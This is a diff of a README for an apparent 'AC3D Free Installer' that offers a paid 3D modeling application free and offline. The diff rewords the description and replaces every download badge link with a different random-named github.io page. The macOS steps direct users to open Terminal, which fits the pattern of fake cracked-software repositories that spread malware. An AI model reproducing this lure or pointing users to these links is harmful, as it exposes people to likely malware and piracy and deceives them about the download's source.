@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-3D+Modeling-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 AC3D Free Installer** — AC3D is a 3D modeling application for Windows, macOS, and Linux with a long history in simulation and game development. Works without internet access, no account required. Full offline installation.
+**💻 AC3D Free Installer** — AC3D is a fast, lightweight 3D modeling application for Windows, macOS, and Linux focused on creating models for simulations, games, and visualizations. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install AC3D](https://img.shields.io/badge/⬇_Install_AC3D-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install AC3D](https://img.shields.io/badge/⬇_Install_AC3D-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About AC3D
 
-AC3D is a 3D modeling application for Windows, macOS, and Linux with a long history in simulation and game development. Known for its use in creating models for flight simulators like X-Plane and FlightGear, AC3D produces clean, game-engine-ready polygon meshes. Its straightforward interface and efficient polygon modeling workflow make it popular for technical and architectural visualization.
+AC3D is a fast, lightweight 3D modeling application for Windows, macOS, and Linux focused on creating models for simulations, games, and visualizations. It supports a wide range of export formats and is popular in the flight simulator and game development communities.
 
 ---
 
 ## ❌ Problem: AC3D is hard to access
 
-- **Dated Interface** — Visual design reflects the software's age
-- **Limited Sculpting** — No organic sculpting tools; polygon modeling focused
-- **Community Size** — Smaller community than Blender or commercial alternatives
-- **Commercial License** — Requires paid license
+- **Dated Interface** — UI design significantly older than modern 3D modeling applications
+- **Limited Features** — Missing many advanced features of Blender or Maya
+- **Paid License** — Requires purchase
+- **Niche Market** — Most popular in simulation and OpenGL/X-Plane development communities
 
 ---
 
@@ -61,9 +61,9 @@ AC3D is a 3D modeling application for Windows, macOS, and Linux with a long hist
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ AC3D is a 3D modeling application for Windows, macOS, and Linux with a long hist
 
 <div align="center">
 
-[![⬇ Install AC3D](https://img.shields.io/badge/⬇_Install_AC3D-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install AC3D](https://img.shields.io/badge/⬇_Install_AC3D-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ AC3D is a 3D modeling application for Windows, macOS, and Linux with a long hist
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ AC3D is a 3D modeling application for Windows, macOS, and Linux with a long hist
 
 ---
 
-**AC3D Free Installer** — AC3D is a 3D modeling application for Windows, macOS, and Linux with a long history in simulation and game development. Install without internet connection today!
+**AC3D Free Installer** — AC3D is a fast, lightweight 3D modeling application for Windows, macOS, and Linux focused on creating models for simulations, games, and visualizations. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install AC3D](https://img.shields.io/badge/⬇_Install_AC3D-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install AC3D](https://img.shields.io/badge/⬇_Install_AC3D-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
